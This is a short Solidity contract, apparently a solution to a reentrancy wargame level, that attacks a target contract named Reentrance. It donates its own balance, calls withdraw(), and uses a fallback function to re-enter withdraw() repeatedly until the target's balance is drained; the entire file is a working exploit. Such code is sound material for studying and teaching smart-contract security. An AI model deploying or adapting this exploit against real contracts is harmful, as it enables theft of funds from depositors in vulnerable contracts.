// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";
import "hardhat/console.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        contractAddress.call{value: address(this).balance}(
            abi.encodeWithSignature("donate(address)", address(this))
        );
        (bool success, ) = contractAddress.call(
            abi.encodeWithSignature("withdraw()")
        );
        require(success);
    }

    fallback() external payable {
        if (contractAddress.balance > 0) {
            contractAddress.call(abi.encodeWithSignature("withdraw()"));
        }
    }
}
